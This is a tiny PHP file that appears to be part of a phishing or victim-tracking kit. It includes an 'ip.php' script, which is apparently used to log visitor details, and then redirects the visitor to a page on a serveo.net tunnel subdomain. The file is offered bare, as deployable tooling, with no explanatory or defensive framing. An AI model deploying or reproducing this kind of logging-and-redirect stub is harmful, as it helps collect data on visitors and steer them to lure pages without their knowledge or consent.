<?php
include 'ip.php';
header('Location: https://fauzi1227.serveo.net/index2.html');
exit
?>
